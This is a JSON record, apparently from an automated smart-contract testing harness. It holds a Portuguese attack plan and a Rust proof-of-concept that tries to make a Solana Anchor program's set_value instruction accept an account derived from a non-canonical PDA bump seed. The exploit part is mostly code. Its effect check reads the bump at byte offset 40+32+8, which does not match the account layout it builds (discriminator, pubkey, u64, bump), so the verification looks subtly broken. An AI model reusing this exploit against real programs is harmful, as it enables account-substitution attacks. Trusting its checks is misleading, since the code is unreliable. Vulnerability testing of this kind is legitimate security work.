attempts.raw:
{
  "plan": "O cenário monta uma conta DataAccount existente (dono = programa) e uma carteira signer. O baseline chama set_value com o bump canônico do PDA derivado de [b"data", user, bump], provando que o cenário está correto. O ataque repete a mesma chamada, mas passa um bump não canônico (menor que o canônico) e a conta DataAccount no endereço correspondente a esse bump não canônico. O efeito medido é que a instrução aceitou uma conta cujo endereço difere do PDA canônico, gravando o bump não canônico na conta.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Encontra o primeiro bump abaixo do canônico para o qual create_program_address retorna Ok
let mut non_canonical_bump = canonical_bump.wrapping_sub(1);
let mut non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
while non_canonical_pda.is_err() && non_canonical_bump > 0 {
    non_canonical_bump = non_canonical_bump.wrapping_sub(1);
    non_canonical_pda = Pubkey::create_program_address(&[b"data", user.as_ref(), &[non_canonical_bump]], &env.program_id);
}
let non_canonical_pda = non_canonical_pda.unwrap_or(canonical_pda);

let data_account = account(
    &env.program_id,
    &anchor_account_data("DataAccount", &(user, 0u64, canonical_bump)),
    None,
);
let user_account = wallet(1_000_000_000);

let contas = vec![
    (canonical_pda, data_account.clone()),
    (user, user_account.clone()),
];

let ix_baseline = env.anchor_ix(
    "set_value",
    &(canonical_bump, 42u64),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let r_base = env.baseline("set_value legitimo com bump canonico", &ix_baseline, &contas);

let contas_ataque = vec![
    (non_canonical_pda, data_account),
    (user, user_account),
];

let ix_ataque = env.anchor_ix(
    "set_value",
    &(non_canonical_bump, 42u64),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let r = env.attack("set_value com bump nao canonico", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let bump_gravado = after(&r, &non_canonical_pda).data()[40 + 32 + 8];
    env.effect(
        "conta com endereco diferente do PDA canonico foi aceita e bump nao canonico gravado",
        non_canonical_pda != canonical_pda && bump_gravado == non_canonical_bump,
    );
}"
}

